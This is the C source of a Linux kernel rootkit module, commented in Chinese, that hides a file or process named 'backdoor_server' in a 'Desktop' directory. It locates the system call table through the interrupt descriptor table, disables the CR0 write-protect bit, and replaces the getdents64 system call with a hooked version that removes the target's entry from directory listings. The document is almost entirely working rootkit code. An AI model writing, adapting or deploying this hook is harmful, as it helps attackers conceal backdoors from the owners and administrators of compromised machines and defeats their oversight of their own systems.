/*
  进程隐藏程序
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>//目录文件结构
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h> //kmalloc
#define CALLOFF 100
int orig_cr0;
char fname[20]="backdoor_server";//需要隐藏的进程名
char *filename=fname;
const char path[10]="Desktop";
//module_param(processname, charp, 0);
struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;//__attribute__ ((packed))不需要内存对齐的优化

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) * idt;

struct linux_dirent{//文件结构体
    unsigned long     d_ino;//索引节点号
    unsigned long     d_off;//在目录文件中的偏移
    unsigned short    d_reclen;//文件名长
    char    d_name[1];//文件名
};

void** sys_call_table;

unsigned int clear_and_return_cr0(void)//设置CR0，取消写保护位，因为在较新的内核中，sys_call_table的内存是只读的，
//所以要修改系统调用表就必须设置CR0
{
    unsigned int cr0 = 0;
    unsigned int ret;

    asm volatile ("movl %%cr0, %%eax"
            : "=a"(cr0)//eax到cr0
         );
    ret = cr0;//

    /*clear the 16th bit of CR0,*/
    cr0 &= 0xfffeffff;//设置CR0，第16位，WP（Write Protect）,它控制是否允许处理器向标志为只读属性的内存页写入数据,
    //0时表示禁用写保护功能
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(cr0)//输入，cr0到eax，eax到cr0
         );
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movl %%eax, %%cr0"
            :
            : "a"(val)//val值给eax，eax的值给CR0,恢复写保护位
         );
}


//asmlinkage long (*orig_getdents)(unsigned int fd,
 //                   struct linux_dirent __user *dirp, unsigned int count);
asmlinkage long (*orig_getdents64)(unsigned int fd, 
			struct linux_dirent64 __user * dirent, unsigned int count);

char * findoffset(char *start)//遍历sys_call代码，查找sys_call_table的地址
{  //也可以通过cat /boot/System.map-`uname -r` |grep sys_call_table  查看当前sys_call_table地址
    char *p;
    for (p = start; p < start + CALLOFF; p++)
    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')//寻找call指令
        return p;
    return NULL;
}



// Determine whether this file_path is the target file_path which target file placed .
int is_hidepath(const unsigned int fd){
	struct file * file_p = NULL; 
	char *cur_path = NULL;
	file_p = fget(fd);
	cur_path=file_p->f_path.dentry->d_iname;
	printk("%d,%s\n",fd,cur_path);
	if(strcmp(path,cur_path)==0)
		return 1;//find
	return 0;
}

// Determine whether this file is the target file.
int is_hidefile(const char * str_name){	
	
	printk("%s\n",str_name);
	if(strcmp(filename,str_name)==0)
		return 1;
	return 0;	
}

asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count){
	
	long value = 0;//filedir byte size
	long left_length = 0; 
	long len = 0;
	if(is_hidepath(fd)==1){// Determine whether this file_path is the target file_path which target file placed .
		struct linux_dirent64 * dirent_cp = NULL;
		struct linux_dirent64 * dirent_orin = NULL;
		value = orig_getdents64(fd,dirent,count);
		dirent_cp = (struct linux_dirent64 *)kmalloc(value,GFP_KERNEL);
		memcpy(dirent_cp,dirent,value);//static inline unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)
		left_length = value;
		dirent_orin = dirent_cp;
		while(left_length>0){
			len = dirent_cp->d_reclen;	
			left_length -=len; 	
			if((is_hidefile((const char*)(dirent_cp->d_name)))==1) // Determine whether this file is the target file.
			{
				printk("find process\n");
				memmove(dirent_cp, (char *) dirent_cp + dirent_cp->d_reclen, left_length);//delete target file
				value -= len;
				printk(KERN_INFO "hide successful.\n");
				memcpy(dirent,dirent_orin,value); //hide successed
				return value;
			}
			if(left_length<=0) { // have no target file
				memcpy(dirent,dirent_orin,value);
				return value;
			}
			//go ahead next
			dirent_cp = (struct linux_dirent64 *) ((char *)dirent_cp + dirent_cp->d_reclen);
		}

	}
	
	
	return orig_getdents64(fd,dirent,count);

}


void **get_sct_addr(void)
{
    unsigned sys_call_off;
    unsigned sct = 0;
    char *p;
    asm("sidt %0":"=m"(idtr));//获取中断描述符表地址
    idt = (void *) (idtr.base + 8 * 0x80);//通过0x80中断找到system_call的服务例程描述符项，一个中断描述符8个字节
    sys_call_off = (idt->off2 << 16) | idt->off1;//找到对应的system_call代码地址
    if ((p = findoffset((char *) sys_call_off)))//找到sys_call_table的地址
        sct = *(unsigned *) (p + 3);
    return ((void **)sct);
}


static int filter_init(void)
{
    sys_call_table = get_sct_addr();
    if (!sys_call_table)
    {
        printk("get_act_addr(): NULL...\n");
        return 0;
    }
    else
        printk("sct: 0x%x\n", (unsigned int)sys_call_table);
    orig_getdents64 = sys_call_table[__NR_getdents64];//保存原来的系统调用

    orig_cr0 = clear_and_return_cr0();//取消写保护位，并且返回原来的cr0
    sys_call_table[__NR_getdents64] = hacked_getdents64;//替换成我们自己写的系统调用
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hideps: module loaded.\n");
                return 0;
}


static void filter_exit(void)
{
    orig_cr0 = clear_and_return_cr0();
    if (sys_call_table)
    sys_call_table[__NR_getdents64] = orig_getdents64;//恢复默认的系统调用
    setback_cr0(orig_cr0);
    printk(KERN_INFO "hideps: module removed\n");
}
module_init(filter_init);
module_exit(filter_exit);
MODULE_LICENSE("GPL");
